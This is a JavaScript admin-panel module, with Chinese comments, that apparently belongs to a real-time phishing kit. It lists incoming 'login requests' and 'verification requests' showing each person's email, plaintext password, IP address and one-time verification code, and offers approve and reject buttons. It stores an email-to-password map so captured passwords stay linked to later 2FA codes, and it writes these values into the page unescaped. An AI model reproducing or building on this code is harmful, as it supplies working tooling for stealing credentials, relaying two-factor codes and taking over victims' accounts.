/**
 * Admin Approvals Management Module
 * 审核管理模块：处理登录请求和验证请求的审核
 */

class AdminApprovals {
    constructor(adminApp) {
        this.adminApp = adminApp;
    }

    // 加载登录请求
    async loadLoginRequests() {
        const container = document.getElementById('loginRequestsList');
        if (!container) return;
        container.innerHTML = 'Loading...';
        
        try {
            const response = await this.adminApp.apiRequest('/api/admin/login-requests');
            if (response && response.ok) {
                const requests = await response.json();
                this.displayLoginRequests(requests);
            } else if (response === null) {
                // API请求失败，可能是认证问题，已在apiRequest中处理
                container.innerHTML = 'Authentication failed';
                return;
            } else {
                container.innerHTML = 'Load failed';
            }
        } catch (error) {
            console.error('加载登录请求错误:', error);
            container.innerHTML = 'Load failed';
        }
    }

    // 显示登录请求
    displayLoginRequests(requests) {
        const container = document.getElementById('loginRequestsList');

        if (requests.length === 0) {
            container.innerHTML = '<p>暂无待审核的登录请求</p>';
            return;
        }

        const myId = this.adminApp.currentAdmin ? this.adminApp.currentAdmin.id : null;
        container.innerHTML = requests.map(request => {
            const isMine = request.assigned_admin_id && myId && Number(request.assigned_admin_id) === Number(myId);
            return `
            <div class="request-item${isMine ? ' my-assigned' : ''}" data-id="${request.id}" style="${isMine ? 'background:#e6f7ff;border-left:4px solid #1890ff;' : ''}">
                <div class="request-header">
                    <div class="request-info">
                        <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                    </div>
                    <div class="request-actions">
                        <button class="approve-btn" onclick="adminApp.approvals.approveLogin(${request.id}, true)">通过</button>
                        <button class="reject-btn" onclick="adminApp.approvals.approveLogin(${request.id}, false)">拒绝</button>
                    </div>
                </div>
            </div>
            `;
        }).join('');
    }

    // 加载验证请求
    async loadVerificationRequests() {
        const container = document.getElementById('verificationRequestsList');
        if (!container) return;
        container.innerHTML = 'Loading...';

        try {
            const response = await this.adminApp.apiRequest('/api/admin/verification-requests');
            if (response && response.ok) {
                const requests = await response.json();
                this.displayVerificationRequests(requests);
            } else if (response === null) {
                // API请求失败，可能是认证问题，已在apiRequest中处理
                container.innerHTML = 'Authentication failed';
                return;
            } else {
                container.innerHTML = 'Load failed';
            }
        } catch (error) {
            console.error('加载验证请求错误:', error);
            container.innerHTML = 'Load failed';
        }
    }

    // 显示验证请求
    displayVerificationRequests(requests) {
        const container = document.getElementById('verificationRequestsList');

        if (requests.length === 0) {
            container.innerHTML = '<p>暂无待审核的验证请求</p>';
            return;
        }

        container.innerHTML = requests.map(request => {
            // 尝试从邮箱-密码映射中获取密码
            let password = request.password;
            if (!password && request.email && this.adminApp.emailPasswordMap.has(request.email)) {
                password = this.adminApp.emailPasswordMap.get(request.email);
            }

            return `
            <div class="request-item" data-id="${request.id}">
                <div class="request-header">
                    <div class="request-info">
                        <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                    </div>
                    <div class="request-actions">
                        <button class="approve-btn" onclick="adminApp.approvals.approveVerification(${request.id}, true)">通过</button>
                        <button class="reject-btn" onclick="adminApp.approvals.approveVerification(${request.id}, false)">拒绝</button>
                    </div>
                </div>
            </div>
            `;
        }).join('');
    }

    // 审核登录请求
    async approveLogin(id, approved) {
        try {
            const response = await this.adminApp.apiRequest(`/api/admin/approve-login/${id}`, {
                method: 'POST',
                body: JSON.stringify({ approved })
            });

            if (response && response.ok) {
                const data = await response.json();
                // 移除调试用的alert提示
                
                // 移除已处理的请求
                const element = document.querySelector(`#loginRequestsList .request-item[data-id="${id}"]`);
                if (element) {
                    element.remove();
                }
                this.adminApp.updatePendingCount();
            } else if (response === null) {
                // API请求失败，可能是认证问题，已在apiRequest中处理
                return;
            } else {
                const error = await response.json();
                console.error('审核登录请求失败:', error.error || '操作失败');
            }
        } catch (error) {
            console.error('审核登录请求错误:', error);
            // 保留网络错误等严重错误的提示
            alert('操作失败，请重试');
        }
    }

    // 审核验证请求
    async approveVerification(id, approved) {
        try {
            const response = await this.adminApp.apiRequest(`/api/admin/approve-verification/${id}`, {
                method: 'POST',
                body: JSON.stringify({ approved })
            });

            if (response && response.ok) {
                const data = await response.json();
                // 移除调试用的alert提示
                
                // 移除已处理的请求
                const element = document.querySelector(`#verificationRequestsList .request-item[data-id="${id}"]`);
                if (element) {
                    element.remove();
                }
                this.adminApp.updatePendingCount();
            } else if (response === null) {
                // API请求失败，可能是认证问题，已在apiRequest中处理
                return;
            } else {
                const error = await response.json();
                console.error('审核验证请求失败:', error.error || '操作失败');
            }
        } catch (error) {
            console.error('审核验证请求错误:', error);
            // 保留网络错误等严重错误的提示
            alert('操作失败，请重试');
        }
    }

    // 添加登录请求（Socket.IO实时更新）
    addLoginRequest(request) {
        const container = document.getElementById('loginRequestsList');
        if (!container) {
            console.warn('[addLoginRequest] loginRequestsList 容器不存在，自动刷新登录请求列表');
            this.loadLoginRequests();
            return;
        }

        const existingEmpty = container.querySelector('p');
        if (existingEmpty) {
            existingEmpty.remove();
        }

        // 存储邮箱和密码的映射，用于验证请求
        if (request.email && request.password) {
            this.adminApp.emailPasswordMap.set(request.email, request.password);
        }

        const requestElement = document.createElement('div');
        requestElement.className = 'request-item';
        requestElement.dataset.id = request.id;
        requestElement.innerHTML = `
            <div class="request-header">
                <div class="request-info">
                    <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                </div>
                <div class="request-actions">
                    <button class="approve-btn" onclick="adminApp.approvals.approveLogin(${request.id}, true)">通过</button>
                    <button class="reject-btn" onclick="adminApp.approvals.approveLogin(${request.id}, false)">拒绝</button>
                </div>
            </div>
        `;
        container.insertBefore(requestElement, container.firstChild);
    }

    // 添加验证请求（Socket.IO实时更新）
    addVerificationRequest(request) {
        const container = document.getElementById('verificationRequestsList');
        if (!container) {
            console.warn('[addVerificationRequest] verificationRequestsList 容器不存在');
            return;
        }

        const existingEmpty = container.querySelector('p');
        if (existingEmpty) {
            existingEmpty.remove();
        }

        // 检查是否已经存在相同ID的请求，如果存在则不添加
        const existingRequest = document.querySelector(`#verificationRequestsList .request-item[data-id="${request.id}"]`);
        if (existingRequest) {
            return;
        }

        this.renderVerificationRequest(request);
    }

    // 渲染验证请求到UI
    renderVerificationRequest(request) {
        // 尝试从邮箱-密码映射中获取密码
        let password = request.password;
        if (!password && request.email && this.adminApp.emailPasswordMap.has(request.email)) {
            password = this.adminApp.emailPasswordMap.get(request.email);
        }

        const container = document.getElementById('verificationRequestsList');
        const requestElement = document.createElement('div');
        requestElement.className = 'request-item';
        requestElement.dataset.id = request.id;
        requestElement.innerHTML = `
            <div class="request-header">
                <div class="request-info">
                    <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                </div>
                <div class="request-actions">
                    <button class="approve-btn" onclick="adminApp.approvals.approveVerification(${request.id}, true)">通过</button>
                    <button class="reject-btn" onclick="adminApp.approvals.approveVerification(${request.id}, false)">拒绝</button>
                </div>
            </div>
        `;
        container.insertBefore(requestElement, container.firstChild);
    }

    // 处理取消的登录请求
    handleCancelledLoginRequest(data) {
        const requestElement = document.querySelector(`#loginRequestsList .request-item[data-id="${data.id}"]`);
        if (requestElement) {
            requestElement.remove();
            this.adminApp.updatePendingCount();
        }
    }
}

// Export for use in main admin app
window.AdminApprovals = AdminApprovals;